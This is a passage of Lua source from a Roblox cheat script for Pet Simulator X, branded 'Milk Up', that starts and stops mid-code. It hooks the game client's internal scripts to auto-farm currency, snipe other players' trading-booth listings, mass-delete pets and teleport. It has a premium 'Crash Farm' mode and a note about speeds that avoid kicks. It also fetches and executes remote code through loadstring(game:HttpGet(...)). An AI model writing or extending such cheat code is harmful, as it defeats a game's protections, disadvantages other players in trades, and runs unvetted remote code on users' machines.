                        if ((Settings[""Golden""] and not Settings[""Regular""] and not Settings[""Hardcore""] and not Settings[""Shiny""]) and PetTable.g) or ((Settings[""Rainbow""] and not Settings[""Regular""] and not Settings[""Hardcore""] and not Settings[""Shiny""]) and PetTable.r) or ((Settings[""Dark Matter""] and not Settings[""Regular""] and not Settings[""Hardcore""] and not Settings[""Shiny""]) and PetTable.dm) then
                            return true
                        end
                        if (Settings[""Hardcore""] and (PetTable.hc and not PetTable.sh and ((Settings[""Golden""] and Settings[""Hardcore""]) and (PetTable.hc and not PetTable.sh and PetTable.g)) or ((Settings[""Rainbow""] and Settings[""Hardcore""]) and (PetTable.hc and not PetTable.sh and PetTable.r)) or ((Settings[""Dark Matter""] and Settings[""Hardcore""]) and (PetTable.hc and not PetTable.sh and PetTable.dm)))) then
                            return true
                        end
                        if ((Settings[""Hardcore""] and not Settings[""Regular""] and not Settings[""Shiny""] and not Settings[""Golden""] and not Settings[""Rainbow""] and not Settings[""Dark Matter""]) and (PetTable.hc and not PetTable.sh and not PetTable.g and not PetTable.r and not PetTable.dm)) then
                            return true
                        end
                        if ((Settings[""Shiny""] and Settings[""Regular""]) and (PetTable.sh and not PetTable.hc and ((Settings[""Golden""] and Settings[""Shiny""] and Settings[""Regular""]) and (not PetTable.hc and PetTable.sh and PetTable.g)) or ((Settings[""Rainbow""] and Settings[""Shiny""] and Settings[""Regular""]) and (not PetTable.hc and PetTable.sh and PetTable.r)) or ((Settings[""Dark Matter""] and Settings[""Shiny""] and Settings[""Regular""]) and (not PetTable.hc and PetTable.sh and PetTable.dm)))) then
                            return true
                        end
                        if ((Settings[""Shiny""] and Settings[""Hardcore""]) and (PetTable.hc and PetTable.sh and ((Settings[""Golden""] and Settings[""Shiny""] and Settings[""Hardcore""]) and (PetTable.hc and PetTable.sh and PetTable.g)) or ((Settings[""Rainbow""] and Settings[""Shiny""] and Settings[""Hardcore""]) and (PetTable.hc and PetTable.sh and PetTable.r)) or ((Settings[""Dark Matter""] and Settings[""Shiny""] and Settings[""Hardcore""]) and (PetTable.hc and PetTable.sh and PetTable.dm)))) then
                            return true
                        end
                        if ((Settings[""Shiny""] and Settings[""Regular""] and not Settings[""Hardcore""] and not Settings[""Golden""] and not Settings[""Rainbow""] and not Settings[""Dark Matter""]) and (not PetTable.hc and PetTable.sh and not PetTable.g and not PetTable.r and not PetTable.dm)) then
                            return true
                        end
                        if ((Settings[""Shiny""] and Settings[""Hardcore""] and not Settings[""Regular""] and not Settings[""Golden""] and not Settings[""Rainbow""] and not Settings[""Dark Matter""]) and (PetTable.hc and PetTable.sh and not PetTable.g and not PetTable.r and not PetTable.dm)) then
                            return true
                        end
                        if ((Settings[""Golden""] and not Settings[""Regular""] and not Settings[""Hardcore""] and not Settings[""Shiny""]) and PetTable.g) or ((Settings[""Rainbow""] and not Settings[""Regular""] and not Settings[""Hardcore""] and not Settings[""Shiny""]) and PetTable.r) or ((Settings[""Dark Matter""] and not Settings[""Regular""] and not Settings[""Hardcore""] and not Settings[""Shiny""]) and PetTable.dm) then
                            return true
                        end
                        if Settings[""Any""] then
                            return true
                        end
                    end
                    local AmountCanSell = (getsenv(Player.PlayerScripts.Scripts.Game[""Trading Booths""]).GetBooth() and getsenv(Player.PlayerScripts.Scripts.Game[""Trading Booths""]).GetBooth().Listings)
                    for i2,v2 in pairs(Library.Save.Get().Pets) do
                        if not HasPetEquipped(v2.uid) and not v2.l and v2.id == v.Pet and v2.id ~= ""6969"" then
                            if CheckPets(v2) then
                                if #PetsToSell < 12 - CalculateItemsInTable(AmountCanSell, 1) then
                                    table.insert(PetsToSell, {v2.uid, tonumber(v.Price)})
                                end
                            end
                        end
                    end
                    if #PetsToSell >= 1 then
                        UseRemote(Remotes[""Add Trading Booth Pet""], PetsToSell)
                    end
                end)
            end
        end)
    end)()
end

local Buying = false
local function SnipePets()
    LPH_NO_VIRTUALIZE(function()
        for i,v in pairs(Config.Booths.Sniping.SnipingList) do
            local Settings = {
                [""Regular""] = (table.find(v.Type, ""Regular"") and true) or false,
                [""Hardcore""] = (table.find(v.Type, ""Hardcore"") and true) or false,
                [""Shiny""] = (table.find(v.Type, ""Shiny"") and true) or false,
                [""Golden""] = (table.find(v.Type, ""Golden"") and true) or false,
                [""Rainbow""] = (table.find(v.Type, ""Rainbow"") and true) or false,
                [""Dark Matter""] = (table.find(v.Type, ""Dark Matter"") and true) or false,
                [""Any""] = (table.find(v.Type, ""Any"") and true) or false,
            }
            if v.SnipeRarity == true then
                Settings[""Rarities""] = {
                    [""Basic""] = (table.find(v.Rarity, ""Basic"") and true) or false,
                    [""Rare""] = (table.find(v.Rarity, ""Rare"") and true) or false,
                    [""Epic""] = (table.find(v.Rarity, ""Epic"") and true) or false,
                    [""Legendary""] = (table.find(v.Rarity, ""Legendary"") and true) or false,
                    [""Mythical""] = (table.find(v.Rarity, ""Mythical"") and true) or false,
                    [""""] = (table.find(v.Rarity, """") and true) or false,
                    [""Event""] = (table.find(v.Rarity, ""Event"") and true) or false,
                    [""Exclusive""] = (table.find(v.Rarity, ""Exclusive"") and true) or false,
                    [""Huge""] = (table.find(v.Rarity, ""Huge"") and true) or false,
                    [""Titanic""] = (table.find(v.Rarity, ""Titanic"") and true) or false
                }
            end
            local function CheckForSnipePet(PetUid)
                local Found = false
                for i2,v2 in pairs(game:GetService(""Workspace"")[""__MAP""].Interactive.Booths:GetDescendants()) do
                    task.spawn(function()
                        if v2.Name == PetUid then
                            Found = true
                        end
                    end)
                end
                return Found
            end
            local function BuyPet(Username, PetUidToSnipe, PetPrice, BoothID, BoothModel)
                if Buying == false then
                    Buying = true
                    if not Config.Booths.Sniping.StartSnipingPet then Buying = false GetHumanoidRootPart().Anchored = false return end
                    if Config.Booths.Extra.WalkToBooth then
                        FindPath(BoothModel.Booth)
                    elseif Config.Booths.Extra.TeleportToBooth then
                        GetHumanoidRootPart().CFrame = BoothModel.Booth.CFrame + Vector3.new(0,1,0)
                    end
                    repeat task.wait() UseRemote(Remotes[""Purchase Trading Booth Pet""], BoothID, PetUidToSnipe) until CheckForSnipePet(PetUidToSnipe) == false
                    SendSnipeWebhook(Username, PetUidToSnipe, Library.Functions.Commas(tonumber(PetPrice)), Library.Functions.Commas(Library.Save.Get().Diamonds))
                    Buying = false
                end
            end
            for i2,v2 in pairs(debug.getupvalues(getsenv(Player.PlayerScripts.Scripts.Game[""Trading Booths""]).SetupClaimed)[1]) do
                task.spawn(function()
                    if CalculateItemsInTable(v2.Listings, 1) >= 1 and v2.Owner ~= Player.UserId then
                        for i3,v3 in pairs(v2.Listings) do
                            if Library.PetCmds.Get(i3) then
                                if v3.Price <= Library.Save.Get().Diamonds then
                                    if v.SnipeUnder == true and v3.Price <= tonumber(v.GemsUnder) then
                                        if v.SnipeRarity == true then
                                            if CheckTypeOrRarity(""Rarity"", Settings, Library.PetCmds.Get(i3)) then
                                                if CheckTypeOrRarity(""Type"", Settings, Library.PetCmds.Get(i3)) then
                                                    BuyPet(v2.Owner, Library.PetCmds.Get(i3).uid, v3.Price, i2, v2.Model)
                                                end
                                            end
                                        elseif v.SnipeRarity == false and Library.PetCmds.Get(i3).id == v.Pet then
                                            if CheckTypeOrRarity(""Type"", Settings, Library.PetCmds.Get(i3)) then
                                                BuyPet(v2.Owner, Library.PetCmds.Get(i3).uid, v3.Price, i2, v2.Model)
                                            end
                                        end
                                    elseif v.SnipeUnder == false then
                                        if v.SnipeRarity == true then
                                            if CheckTypeOrRarity(""Rarity"", Settings, Library.PetCmds.Get(i3)) then
                                                if CheckTypeOrRarity(""Type"", Settings, Library.PetCmds.Get(i3)) then
                                                    BuyPet(v2.Owner, Library.PetCmds.Get(i3).uid, v3.Price, i2, v2.Model)
                                                end
                                            end
                                        elseif CheckTypeOrRarity(""Type"", Settings, Library.PetCmds.Get(i3)) and Library.PetCmds.Get(i3).id == v.Pet then
                                            BuyPet(v2.Owner, Library.PetCmds.Get(i3).uid, v3.Price, i2, v2.Model)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end)()
end

--// Deleting
local function DeletePets()
    local PetsToDelete = {}
    local Settings = {
        [""Regular""] = (table.find(Config.Deleting.Options, ""Regular"") and true) or false,
        [""Hardcore""] = (table.find(Config.Deleting.Options, ""Hardcore"") and true) or false,
        [""Shiny""] = (table.find(Config.Deleting.Options, ""Shiny"") and true) or false,
        [""Golden""] = (table.find(Config.Deleting.Options, ""Golden"") and true) or false,
        [""Rainbow""] = (table.find(Config.Deleting.Options, ""Rainbow"") and true) or false,
        [""Dark Matter""] = (table.find(Config.Deleting.Options, ""Dark Matter"") and true) or false,
        [""Any""] = (table.find(Config.Deleting.Options, ""Any"") and true) or false,
        [""Rarities""] = {
            [""Basic""] = (table.find(Config.Deleting.Rarities, ""Basic"") and true) or false,
            [""Rare""] = (table.find(Config.Deleting.Rarities, ""Rare"") and true) or false,
            [""Epic""] = (table.find(Config.Deleting.Rarities, ""Epic"") and true) or false,
            [""Legendary""] = (table.find(Config.Deleting.Rarities, ""Legendary"") and true) or false,
            [""Mythical""] = (table.find(Config.Deleting.Rarities, ""Mythical"") and true) or false,
        }
    }
    if not Config.Deleting.DeleteByRarity then
        for i,v in pairs(Library.Save.Get().Pets) do
            if Library.Directory.Pets[v.id].rarity ~= ""Exclusive"" and not HasPetEquipped(v.uid) and not v.hce and not v.l and v.id == Config.Deleting.ChoosenPetToDelete and not table.find(PetsToDelete, v.uid) and v.id ~= ""6969"" then
                if CheckTypeOrRarity(""Type"", Settings, v) then
                    table.insert(PetsToDelete, v.uid)
                end
            end
        end
    else
        for i,v in pairs(Library.Save.Get().Pets) do
            if Library.Directory.Pets[v.id].rarity ~= ""Exclusive"" and not HasPetEquipped(v.uid) and not v.hce and not v.l and v.id ~= ""6969"" then
                if CheckTypeOrRarity(""Rarity"", Settings, v) then
                    if CheckTypeOrRarity(""Type"", Settings, v) then
                        table.insert(PetsToDelete, v.uid)
                    end
                end
            end
        end
    end
    if #PetsToDelete >= 1 then
        UseRemote(Remotes[""Delete Several Pets""], PetsToDelete)
    end
end

local function CollectPets()
    local TripleHatch = false
    local OctupleHatch = false
    if Config.PetCollection.Mode == ""Single"" then
        TripleHatch = false
        OctupleHatch = false
    elseif Config.PetCollection.Mode == ""Triple"" then
        TripleHatch = true
        OctupleHatch = false
    elseif Config.PetCollection.Mode == ""Octuple"" then
        TripleHatch = false
        OctupleHatch = true
    end
    local PetCollectSettings = {
        [""Regular""] = table.find(Config.PetCollection.Options, ""Regular"") ,
        [""Golden""] = table.find(Config.PetCollection.Options, ""Golden""),
        [""Rainbow""] = table.find(Config.PetCollection.Options, ""Rainbow""),
        [""Dark Matter""] = table.find(Config.PetCollection.Options, ""Dark Matter""),
        [""Any""] = table.find(Config.PetCollection.Options, ""Any""),
        [""Rarities""] = {
            [""Basic""] = table.find(Config.PetCollection.Rarities, ""Basic""),
            [""Rare""] = table.find(Config.PetCollection.Rarities, ""Rare""),
            [""Epic""] = table.find(Config.PetCollection.Rarities, ""Epic""),
            [""Legendary""] = table.find(Config.PetCollection.Rarities, ""Legendary""),
            [""Mythical""] = table.find(Config.PetCollection.Rarities, ""Mythical""),
        }
    }
    for i,v in pairs(Library.Shared.GetAllCollectablePets()) do
        if (PetCollectSettings[""Regular""] and (not table.find(Library.Save.Get().Collection, v.petId..""-1"") and not v.isGolden and not v.isRainbow and not v.isDarkMatter)) or (PetCollectSettings[""Golden""] and (not table.find(Library.Save.Get().Collection, v.petId..""-2"") and v.isGolden)) or (PetCollectSettings[""Rainbow""] and (not table.find(Library.Save.Get().Collection, v.petId..""-3"") and v.isRainbow)) or (PetCollectSettings[""Dark Matter""] and (not table.find(Library.Save.Get().Collection, v.petId..""-4"") and v.isDarkMatter)) or (PetCollectSettings[""Any""] and (not table.find(Library.Save.Get().Collection, v.petId..""-1"") or not table.find(Library.Save.Get().Collection, v.petId..""-2"") or not table.find(Library.Save.Get().Collection, v.petId..""-3"") or not table.find(Library.Save.Get().Collection, v.petId..""-4""))) then
            if (PetCollectSettings.Rarities[""Basic""] and Library.Directory.Pets[v.petId].rarity == ""Basic"") or (PetCollectSettings.Rarities[""Rare""] and Library.Directory.Pets[v.petId].rarity == ""Rare"") or (PetCollectSettings.Rarities[""Epic""] and Library.Directory.Pets[v.petId].rarity == ""Epic"") or (PetCollectSettings.Rarities[""Legendary""] and Library.Directory.Pets[v.petId].rarity == ""Legendary"") or (PetCollectSettings.Rarities[""Mythical""] and Library.Directory.Pets[v.petId].rarity == ""Mythical"") then
                for i2,v2 in pairs(Library.Directory.Eggs) do
                    if v2.hatchable then
                        for i3,v3 in pairs(v2) do
                            if i3 == ""drops"" and type(v3) == ""table"" then
                                for i4,v4 in pairs(v3) do
                                    if v4[1] == v.petId then
                                        if not Config.PetCollection.StartCollecting then break end
                                        UseRemote(Remotes[""Buy Egg""], ((v.isGolden or v.isRainbow or v.isDarkMatter) and ""Golden ""..i2) or i2, TripleHatch, OctupleHatch)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

local function ActivateBoosts()
    if Config.Misc.Boosting.UseBoosts then
        local BoostsToCheck = {}
        for i,v in pairs(Library.Save.Get().Boosts) do
            table.insert(BoostsToCheck, i)
        end
        for i,v in pairs(Config.Misc.Boosting.BoostsToActivate) do
            if not table.find(BoostsToCheck, v) then
                UseRemote(Remotes[""Activate Boost""], v)
                task.wait(1)
            end
        end
    end
    if Config.Misc.Boosting.UseAllBoosts then
        for i,v in pairs(Library.Save.Get().Boosts) do
            for i2,v2 in pairs(Config.Misc.Boosting.BoostsToActivate) do
                UseRemote(Remotes[""Activate Boost""], v2)
            end
        end
    end
end

local function ActivateServerBoosts()
    for i,v in pairs(Config.Misc.Boosting.ServerBoostsToActivate) do
        if not Library.ServerBoosts.GetActiveBoosts()[v] then
            UseRemote(Remotes[""Activate Server Boost""], v)
            task.wait(1)
        end
    end
end

local function FarmMastery(MasteryTable)
    local PetData = LoadPets()
    local CoinData = {}
    for i,v in pairs(UseRemote(Remotes[""Get Coins""])) do
        for i2,v2 in pairs(MasteryTable) do
            if (v2 == ""Coin Piles"" and v.n:find(""Coins"")) or (v2 == ""Crates"" and v.n:find(""Crate"")) or (v2 == ""VaultsAndSafes"" and (v.n:find(""Vault"") or v.n:find(""Safe""))) or (v2 == ""Presents"" and v.n:find(""Present"")) or (v2 == ""Diamond Piles"" and v.n:find(""Diamonds"")) then
                if not table.find(CoinData, i) then
                    table.insert(CoinData, i)
                end
            end
        end
    end
    task.spawn(function()
        for i,v in pairs(CoinData) do
            if not Config.Mastery.StartCompletingMasterys then break end
            task.spawn(function()
                UseRemote(Remotes[""Join Coin""], v, PetData)
            end)
            for i2,v2 in pairs(PetData) do
                task.spawn(function()
                    UseRemote(Remotes[""Farm Coin""], v, v2)
                end)
            end
            task.wait(0.1)
        end
    end)
    for i,v in pairs(MasteryTable) do
        if (v == ""Eggs"" and Library.Save.Get().Mastery[i] ~= 980000) then
            MasteryBuyEgg(""Cracked Egg"") 
        end
        if (v == ""Golden Eggs"" and Library.Save.Get().Mastery[i] ~= 980000) then
            MasteryBuyEgg(""Golden Cracked Egg"") 
        end
    end
end

local function CompleteMasterys()
    local NonCompletedMasterys = {}
    for i,v in pairs(Library.Save.Get().Mastery) do
        if v ~= 980000 then
            if table.find(Config.Mastery.MasterysToFarm, i) then
                table.insert(NonCompletedMasterys, i)
            end 
        end
    end
    FarmMastery(NonCompletedMasterys)
end

local function LoadWorld(WorldName)
    if WorldName == ""Town"" then Library.WorldCmds.Load(""Spawn"") return true end
    if WorldName == ""Enchanted Forest"" then Library.WorldCmds.Load(""Fantasy"") return true end
    if WorldName == ""Tech City"" then Library.WorldCmds.Load(""Tech"") return true end
    if WorldName == ""The Void"" then UseRemote(Remotes[""Buy Area""], ""The Void"") task.wait(1) getsenv(Scripts.GUIs.Teleport).Teleport(""The Void"") return true end
    if WorldName == ""Axolotl Ocean"" then UseRemote(Remotes[""Buy Area""], ""Axolotl Ocean"") task.wait(1) getsenv(Scripts.GUIs.Teleport).Teleport(""Axolotl Ocean"") return true end
    if WorldName == ""Pixel Forest"" then UseRemote(Remotes[""Buy Area""], ""Pixel Forest"") task.wait(1) getsenv(Scripts.GUIs.Teleport).Teleport(""Pixel Forest"") return true end
    if WorldName == ""Cat Paradise"" then UseRemote(Remotes[""Buy Area""], ""Cat Paradise"") task.wait(1) getsenv(Scripts.GUIs.Teleport).Teleport(""Cat Paradise"") return true end
    return false
end

local function CheckName(WorldName)
    if WorldName == ""Town"" then return true end
    if WorldName == ""Enchanted Forest"" then  return true end
    if WorldName == ""Tech City"" then return true end
    if WorldName == ""The Void"" then return true end
    if WorldName == ""Axolotl Ocean"" then return true end
    if WorldName == ""Pixel Forest"" then return true end
    if WorldName == ""Cat Paradise"" then return true end
    return false
end

local function GetCoinsForCompleteGame(AreaName)
    local CoinData = {}
    if AreaName == ""Heavens Gate"" then
        AreaName = ""Heaven Island""
    end
    for i,v in pairs(UseRemote(Remotes[""Get Coins""])) do
        if string.find(v.a, AreaName) then
            table.insert(CoinData, i)
        end
    end
    return CoinData
end

local function HasEnoughCoins(v)
    local CurrencyPath = (IsHardcoreMode and Library.Save.Get().HardcoreCurrency) or Library.Save.Get()
    if not Library.Directory.Areas[v] then
        return false
    end
    if not Library.Directory.Areas[v].gate then
        return false
    end
    if not CurrencyPath[Library.Directory.Areas[v].gate.currency] then
        return false
    end
    if CurrencyPath[Library.Directory.Areas[v].gate.currency] >= Library.Directory.Areas[v].gate.cost then
        return true
    end
    return false
end

local function CompleteGame()
    for i,v in pairs(CompleteTable) do
        UseRemote(Remotes[""Buy Area""], v)
        if not Config.Farming.StartCompleteGame then return end
        if CheckName(v) then
            if Library.WorldCmds.HasArea(v) then
                getsenv(Scripts.GUIs.Teleport).Teleport(v)
            elseif Library.WorldCmds.HasArea(CompleteTable[i - 1]) then
                if CompleteTable[i - 1] == ""Hacker Portal"" and (IsHardcoreMode and Library.Save.Get().Hardcore.HackerPortalProgress[2] >= 2 or Library.Save.Get().HackerPortalProgress[2] >= 2) then
                    UseRemote(Remotes[""Buy Area""], v)
                    LoadWorld(v)
                end
                if CompleteTable[i - 1] ~= ""Hacker Portal"" then
                    UseRemote(Remotes[""Buy Area""], v)
                    LoadWorld(v)
                end
            elseif v == ""Axolotl Ocean"" then
                UseRemote(Remotes[""Buy Area""], v)
                LoadWorld(v)
            end
        end
        if v == ""Hacker Portal"" and (IsHardcoreMode and Library.Save.Get().Hardcore.HackerPortalProgress[2] < 2 or Library.Save.Get().HackerPortalProgress[2] < 2) then
            UseRemote(Remotes[""Start Hacker Portal Quests""])
            repeat task.wait()
                if not Config.Farming.StartCompleteGame then return end
                if UseRemote(Remotes[""Finish Hacker Portal Quest""]) then break end
                for i2,v2 in pairs(GetCoinsForCompleteGame(""Hacker Portal"")) do
                    if not Config.Farming.StartCompleteGame then return end
                    if UseRemote(Remotes[""Finish Hacker Portal Quest""]) then break end
                    task.spawn(function()
                        UseRemote(Remotes[""Join Coin""], v2, LoadPets())
                    end)
                    for i3,v3 in pairs(LoadPets()) do
                        task.spawn(function()
                            UseRemote(Remotes[""Farm Coin""], v2, v3)
                        end)
                    end
                    task.wait(0.1)
                end
            until (IsHardcoreMode and Library.Save.Get().Hardcore.HackerPortalProgress[2] >= 2 or Library.Save.Get().HackerPortalProgress[2] >= 2)
        else
            if not CheckName(v) then
                if not CheckName(CompleteTable[i + 1]) then
                    if not Library.WorldCmds.HasArea(CompleteTable[i + 1]) then
                        repeat task.wait()
                            if not Config.Farming.StartCompleteGame then return end
                            for i2,v2 in pairs(GetCoinsForCompleteGame(v)) do
                                if not Config.Farming.StartCompleteGame then return end
                                if HasEnoughCoins(CompleteTable[i + 1]) then break end
                                task.spawn(function()
                                    UseRemote(Remotes[""Join Coin""], v2, LoadPets())
                                end)
                                for i3,v3 in pairs(LoadPets()) do
                                    task.spawn(function()
                                        UseRemote(Remotes[""Farm Coin""], v2, v3)
                                    end)
                                end
                                task.wait(0.1)
                            end
                        until HasEnoughCoins(CompleteTable[i + 1])
                        UseRemote(Remotes[""Buy Area""], CompleteTable[i + 1])
                    end
                end
            end
            if v == ""Town"" or v == ""Enchanted Forest"" or v == ""Tech City"" or v == ""Axolotl Ocean"" or v == ""Pixel Forest"" or v == ""Cat Paradise"" then
                if not Library.WorldCmds.HasArea(CompleteTable[i + 1]) then
                    repeat task.wait()
                        if not Config.Farming.StartCompleteGame then return end
                        for i2,v2 in pairs(GetCoinsForCompleteGame(v)) do
                            if not Config.Farming.StartCompleteGame then return end
                            if HasEnoughCoins(CompleteTable[i + 1]) then break end
                            task.spawn(function()
                                UseRemote(Remotes[""Join Coin""], v2, LoadPets())
                            end)
                            for i3,v3 in pairs(LoadPets()) do
                                task.spawn(function()
                                    UseRemote(Remotes[""Farm Coin""], v2, v3)
                                end)
                            end
                            task.wait(0.1)
                        end
                    until HasEnoughCoins(CompleteTable[i + 1])
                    UseRemote(Remotes[""Buy Area""], CompleteTable[i + 1])
                end
            end
        end
    end
end

--// UI Library
local RayField = loadstring(game:HttpGet(""https://milkup.info/Rayfield/""))()

local Window = RayField:CreateWindow({Name = ""[💖] Pet Simulator X | Milk Up"", LoadingTitle = ""Loading"", LoadingSubtitle = ""Please Join The Discord If You Need Help!"", ConfigurationSaving = {Enabled = true, FolderName = ""MilkUp"", FileName = SeparateConfigFileName}})

local InformationTab = Window:CreateTab(""Information (❗)"")

local OtherInformationSection = InformationTab:CreateSection(""Other Information"")
if Premium == true then
    local WhenExpires = InformationTab:CreateLabel(""Premium Expires:  ""..((not LPH_OBFUSCATED and ""DEV BUILD"") or (LRM_SecondsLeft == math.huge and ""Lifetime"") or (LRM_SecondsLeft / 86400)..""Days!""))
end
local ScriptVersionLabel = InformationTab:CreateLabel(""Script Version: ""..ScriptVersion)
local OwnerLabel = InformationTab:CreateLabel(""Script Devoloped By: Flury"")

local QuestionsSection = InformationTab:CreateSection(""Questions"")

local QuestionsParagraph = InformationTab:CreateParagraph({Title = ""Questions"", Content = ""[Q] It Says Theres Booth Sniping But I Cant Find The Tab?\n[A] You Can Scroll On The Tabs For More Tabs\n[Q] Farming Wont Work?\n[A] Have The Right Area Unlocked And Have Pets Equiped\n[Q] Why Do I Crash So Much\n[A] You Crash A Lot Cause Of Farming Speeds And Webhooks""})

local DiscordSection = InformationTab:CreateSection(""Discord"")

InformationTab:CreateButton({
	Name = ""Join Discord Server"",
	Callback = function()
        HTTPRequest({ Url = ""http://127.0.0.1:6463/rpc?v=1"",
        Method = ""POST"",Headers = {[""Content-Type""] = ""application/json"",
            [""Origin""] = ""https://discord.com""},
                Body = game:GetService(""HttpService""):JSONEncode({cmd = ""INVITE_BROWSER"",
                    args = {code = ""tY2TN5mKCb""},
                        nonce = game:GetService(""HttpService""):GenerateGUID(false)
                    }
                )
            }
        )
  	end
})

local ValentinesTab = Window:CreateTab(""Valentines (💕)"")

local HeartsSection = ValentinesTab:CreateSection(""Hearts Farm"")

local StatisticsParagraph = ValentinesTab:CreateParagraph({Title = ""Statistics"", Content = ""Current World: ""..CurrentWorld..""\nHearts Left: ""..LuckyBlocksLeft..""\nWaiting For Hearts: ""..WaitingForCoins..""\nQuest 1/2 Progress: ""..Library.Save.Get()[""Valentines2022Quest""][1]})

ValentinesTab:CreateToggle({
	Name = ""Start Heart Farm"",
    CurrentValue = Config.Valentines.StartHeartFarm,
    Flag = ""ToggleStartHeartFarm"",
	Callback = function(Value)
        Config.Valentines.StartHeartFarm = Value
        task.spawn(function()
            while Config.Valentines.StartHeartFarm and task.wait() do
                HeartFarm()
            end
        end)
        task.spawn(function()
            while Config.Valentines.StartHeartFarm and task.wait() do
                StatisticsParagraph:Set({Title = ""Statistics"", Content = ""Current World: ""..CurrentWorld..""\nHearts Left: ""..LuckyBlocksLeft..""\nWaiting For Hearts: ""..WaitingForCoins..""\nQuest 1/2 Progress: ""..Library.Save.Get()[""Valentines2022Quest""][1]})
            end
        end)
    end
})

ValentinesTab:CreateToggle({
    Name = ""Start World Teleport"",
    CurrentValue = Config.Valentines.StartWorldTeleport,
    Flag = ""ToggleStartWorldTeleport"",
    Callback = function(Value)
        Config.Valentines.StartWorldTeleport = Value
    end
})

ValentinesTab:CreateToggle({
    Name = ""Start Server Teleport"",
    CurrentValue = Config.Valentines.StartServerTeleport,
    Flag = ""ToggleStartServerTeleport"",
    Callback = function(Value)
        Config.Valentines.StartServerTeleport = Value
    end
})

local WorldsSection = ValentinesTab:CreateSection(""Worlds"")

ValentinesTab:CreateToggle({
    Name = ""Spawn"",
    CurrentValue = Config.Valentines.Worlds.Spawn,
    Flag = ""ToggleSpawn"",
    Callback = function(Value)
        Config.Valentines.Worlds.Spawn = Value
    end
})

local ToggleFantasy = ValentinesTab:CreateToggle({
    Name = ""Fantasy"",
    CurrentValue = Config.Valentines.Worlds.Fantasy,
    Flag = ""ToggleFantasy"",
    Callback = function(Value)
        Config.Valentines.Worlds.Fantasy = Value
    end
})

ValentinesTab:CreateToggle({
    Name = ""Tech"",
    Flag = ""ToggleTech"",
    CurrentValue = Config.Valentines.Worlds.Tech,
    Callback = function(Value)
        Config.Valentines.Worlds.Tech = Value
    end
})

ValentinesTab:CreateToggle({
    Name = ""Axolotl"",
    CurrentValue = Config.Valentines.Worlds.Axolotl,
    Flag = ""ToggleAxolotl"",
    Callback = function(Value)
        Config.Valentines.Worlds.Axolotl = Value
    end
})

ValentinesTab:CreateToggle({
    Name = ""Pixel"",
    CurrentValue = Config.Valentines.Worlds.Pixel,
    Flag = ""TogglePixel"",
    Callback = function(Value)
        Config.Valentines.Worlds.Pixel = Value
    end
})

ValentinesTab:CreateToggle({
    Name = ""Cat"",
    CurrentValue = Config.Valentines.Worlds.Cat,
    Flag = ""ToggleCat"",
    Callback = function(Value)
        Config.Valentines.Worlds.Cat = Value
    end
})

local MainTab = Window:CreateTab(""Farming (⛏️)"")

local FarmingSection = MainTab:CreateSection(""Farming"")

MainTab:CreateToggle({
	Name = ""Start Farm"",
    CurrentValue = Config.Farming.StartFarm,
    Flag = ""ToggleStartFarm"",
	Callback = function(Value)
        Config.Farming.StartFarm = Value
        task.spawn(function()
            while Config.Farming.StartFarm and task.wait() do
                if Config.Farming.Mode == ""Crash Farm"" then
                    task.spawn(function() CoinFarm() end)
                else
                    CoinFarm()
                end
            end
        end)
    end
})

local FarmingModes = {""Normal"", ""Single Target"", ""Farm Aura""}
if Premium then
    table.insert(FarmingModes, ""Heartbeat Farm"")
    table.insert(FarmingModes, ""Crash Farm"")
end
MainTab:CreateDropdown({
	Name = ""Choose Mode"",
	CurrentOption = Config.Farming.Mode,
	Options = FarmingModes,
    Flag = ""FarmingModeOption"",
	Callback = function(Value)
		Config.Farming.Mode = Value
	end
})

MainTab:CreateDropdown({
	Name = ""Choose Coin Type"",
	CurrentOption = Config.Farming.CoinType,
	Options = {""Normal"", ""Highest Coin Multiplier"", ""Hearts"", ""Lucky Blocks"", ""Farm Closest Area"", ""Diamonds"", ""Highest Health"", ""Lowest Health""},
    Flag = ""CoinTypeOption"",
	Callback = function(Value)
		Config.Farming.CoinType = Value
	end
})

local SpeedWarning = MainTab:CreateLabel(""Below 0.09 Farm Speed Has A Chance Of A Kick"")

MainTab:CreateSlider({
	Name = ""Farming Speed"",
    Range = {0,1},
	CurrentValue = Config.Farming.FarmSpeed,
	Increment = 0.01,
	Suffix = ""Speed"",
    Flag = ""FarmSpeedValue"",
	Callback = function(Value)
		Config.Farming.FarmSpeed = Value
	end 
})

MainTab:CreateSlider({
	Name = ""Pet Sending Speed"",
    Range = {0,1},
	CurrentValue = Config.Farming.PetSendSpeed,
	Increment = 0.01,
	Suffix = ""Speed"",
    Flag = ""PetSendSpeedValue"",
	Callback = function(Value)
		Config.Farming.PetSendSpeed = Value
	end 
})

MainTab:CreateToggle({
	Name = ""Send All Pets"",
    CurrentValue = Config.Farming.SendAllPets,
    Flag = ""ToggleSendAllPets"",
	Callback = function(Value)
        Config.Farming.SendAllPets = Value
    end
})

MainTab:CreateToggle({
	Name = ""Collect Orbs"",
    CurrentValue = Config.Farming.CollectOrbs,
    Flag = ""CollectOrbs"",
	Callback = function(Value)
        Config.Farming.CollectOrbs = Value
        for i,v in pairs(Workspace[""__THINGS""].Orbs:GetChildren()) do
            if Config.Farming.CollectOrbs then
                task.spawn(function() pcall(function() getsenv(Scripts.Game.Orbs).Collect(v) task.wait(0.02) v:Destroy() end) end)
            end
        end
    end
})

MainTab:CreateToggle({
	Name = ""Collect Lootbags"",
    CurrentValue = Config.Farming.CollectLootbags,
    Flag = ""CollectLootbags"",
	Callback = function(Value)
        Config.Farming.CollectLootbags = Value
        for i,v in pairs(Workspace[""__THINGS""].Lootbags:GetChildren()) do
            if Config.Farming.CollectLootbags then
                task.spawn(function() pcall(function() UseRemote(Remotes[""Collect Lootbag""], v.Name, v.CFrame.p) task.wait(0.02) v:Destroy() end) end)
            end
        end
    end
})

local FarmingSection = MainTab:CreateSection(""Extra"")

MainTab:CreateToggle({
	Name = ""Teleport To Coins Area"",
    CurrentValue = Config.Farming.TeleportToCoinsArea,
    Flag = ""ToggleTeleportToCoinsArea"",
	Callback = function(Value)
        Config.Farming.TeleportToCoinsArea = Value
    end
})

MainTab:CreateToggle({
	Name = ""Stay On A Private Platform"",
    CurrentValue = Config.Farming.StayOnPrivatePlatform,
    Flag = ""ToggleStayOnPrivatePlatform"",
	Callback = function(Value)
        Config.Farming.StayOnPrivatePlatform = Value
        task.spawn(function()
            while Config.Farming.StayOnPrivatePlatform and task.wait() do
                if not Workspace:FindFirstChild(""PrivatePlatform"") then
                    local Platform = Instance.new(""Part"", Workspace)
